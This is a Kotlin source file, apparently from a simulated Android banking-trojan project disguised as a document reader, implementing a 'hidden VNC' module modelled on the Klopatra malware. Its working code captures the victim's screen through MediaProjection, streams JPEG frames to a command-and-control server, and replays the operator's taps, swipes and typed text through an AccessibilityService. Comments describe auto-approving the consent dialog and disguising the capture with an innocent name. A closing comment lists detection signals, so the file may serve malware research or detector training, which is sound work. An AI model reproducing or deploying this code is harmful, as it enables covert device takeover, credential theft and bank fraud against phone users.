package com.docreader.lite.reader.advanced

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Path
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import com.docreader.lite.reader.Exfil
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

/**
 * Hidden VNC — Klopatra pattern (2025).
 *
 * Remote control of victim device:
 *   - MediaProjection captures screen → frames sent to C2
 *   - C2 operator views live screen in web panel
 *   - Operator sends click/swipe/type commands
 *   - AccessibilityService dispatches gestures on device
 *
 * Why "hidden": virtual display captures screen content without
 * the user seeing any recording indicator (on some OEM ROMs).
 * Standard MediaProjection shows persistent notification — banker
 * replaces it with benign-looking notification via FG service.
 *
 * Klopatra: Virbox-protected, Yamux-multiplexed VNC stream.
 * Here: simplified MediaProjection + frame capture + gesture dispatch.
 *
 * Detection: MediaProjection active + Accessibility binding +
 * high-frequency gesture dispatch from non-foreground process.
 */
object HiddenVnc {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var capturing = false

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())

    private var screenWidth = 1080
    private var screenHeight = 2340
    private var screenDpi = 440

    /**
     * Initialize MediaProjection (requires user consent via system dialog).
     * Real banker: triggers this after obtaining Accessibility,
     * auto-clicks the "Start Now" consent button via A11y.
     */
    fun initProjection(projection: MediaProjection, width: Int, height: Int, dpi: Int) {
        mediaProjection = projection
        screenWidth = width
        screenHeight = height
        screenDpi = dpi
    }

    /**
     * Start screen capture — creates VirtualDisplay + ImageReader.
     * Frames captured at configurable FPS (default 2fps for bandwidth).
     */
    fun startCapture(fps: Int = 2) {
        val proj = mediaProjection ?: return
        if (capturing) return
        capturing = true

        imageReader = ImageReader.newInstance(
            screenWidth / 2, screenHeight / 2, // half-res to save bandwidth
            android.graphics.PixelFormat.RGBA_8888,
            2
        )

        virtualDisplay = proj.createVirtualDisplay(
            "DocReaderSync", // innocent name
            screenWidth / 2, screenHeight / 2, screenDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface,
            null, null
        )

        // Frame capture loop
        scope.launch {
            val intervalMs = 1000L / fps
            while (capturing) {
                captureFrame()
                delay(intervalMs)
            }
        }
    }

    fun stopCapture() {
        capturing = false
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()
        virtualDisplay = null
        imageReader = null
        mediaProjection = null
    }

    /**
     * Capture one frame from ImageReader.
     * Encode as JPEG and queue for C2 transmission.
     */
    private fun captureFrame() {
        val reader = imageReader ?: return
        val image = try {
            reader.acquireLatestImage() ?: return
        } catch (_: Exception) { return }

        try {
            val plane = image.planes[0]
            val buffer = plane.buffer
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val rowPadding = rowStride - pixelStride * image.width

            val bitmap = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)

            // Encode to JPEG (quality 30 for bandwidth)
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 30, stream)
            val frameBytes = stream.toByteArray()
            bitmap.recycle()

            // Send frame to C2
            onFrameCaptured?.invoke(frameBytes)

        } catch (_: Exception) {
        } finally {
            image.close()
        }
    }

    // ─── Remote command dispatch ────────────────────────────────────────

    /**
     * Execute remote command from C2 operator via AccessibilityService.
     */
    fun executeCommand(service: AccessibilityService, command: VncCommand) {
        when (command) {
            is VncCommand.Tap -> {
                InputTiming.tapWithJitter(service, command.x, command.y)
            }
            is VncCommand.Swipe -> {
                val path = Path().apply {
                    moveTo(command.startX, command.startY)
                    lineTo(command.endX, command.endY)
                }
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0, 300))
                    .build()
                service.dispatchGesture(gesture, null, null)
            }
            is VncCommand.Type -> {
                // Find focused EditText and set text
                val root = service.rootInActiveWindow ?: return
                val focused = findFocusedInput(root)
                if (focused != null) {
                    val args = android.os.Bundle().apply {
                        putCharSequence(
                            android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                            command.text
                        )
                    }
                    focused.performAction(
                        android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args
                    )
                    focused.recycle()
                }
                root.recycle()
            }
            is VncCommand.Back -> {
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
            }
            is VncCommand.Home -> {
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
            }
            is VncCommand.Recents -> {
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
            }
        }

        Exfil.event("vnc_command",
            "type" to command::class.simpleName.toString(),
        )
    }

    private fun findFocusedInput(node: android.view.accessibility.AccessibilityNodeInfo): android.view.accessibility.AccessibilityNodeInfo? {
        if (node.isFocused && node.className?.toString() == "android.widget.EditText") {
            return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findFocusedInput(child)
            if (result != null) return result
            child.recycle()
        }
        return null
    }

    // ─── Command types ─────────────────────────────────────────────────

    sealed class VncCommand {
        data class Tap(val x: Float, val y: Float) : VncCommand()
        data class Swipe(val startX: Float, val startY: Float,
                         val endX: Float, val endY: Float) : VncCommand()
        data class Type(val text: String) : VncCommand()
        object Back : VncCommand()
        object Home : VncCommand()
        object Recents : VncCommand()
    }

    // Frame callback
    var onFrameCaptured: ((ByteArray) -> Unit)? = null
}
